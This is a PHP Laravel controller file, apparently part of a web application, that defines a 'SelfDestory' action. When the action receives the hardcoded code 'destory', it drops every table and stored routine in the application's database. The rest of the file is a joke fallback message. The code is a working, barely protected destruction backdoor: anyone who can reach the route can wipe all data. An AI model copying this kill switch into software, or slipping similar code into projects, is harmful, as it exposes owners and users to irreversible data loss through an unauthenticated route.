<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;

class SelfDestory extends Controller
{
    public function startSelfDestory($selfDestoryInitiationCode){
        if($selfDestoryInitiationCode == 'destory' ){

            $DB_Name = env('DB_DATABASE');
            $tables = DB::select('SELECT table_name FROM information_schema.tables WHERE table_schema = ?',[$DB_Name]);

            DB::statement('SET FOREIGN_KEY_CHECKS = 0');
            foreach($tables as $table){
                Schema::drop($table->table_name);
            }
            DB::statement('SET FOREIGN_KEY_CHECKS = 1');

            $DropStatements = DB::select("SELECT CONCAT('DROP ',ROUTINE_TYPE,' IF EXISTS ',ROUTINE_SCHEMA,'.',ROUTINE_NAME,';') as statement FROM information_schema.ROUTINES WHERE ROUTINE_SCHEMA = ?;",[$DB_Name]);
            foreach($DropStatements as $DropStatement){
                DB::connection()->getpdo()->exec($DropStatement->statement);
            }
            return 'All Tables Drop ';
        }
        else{
            return "MaMMa Mia i'm joking";
        }
    }
}
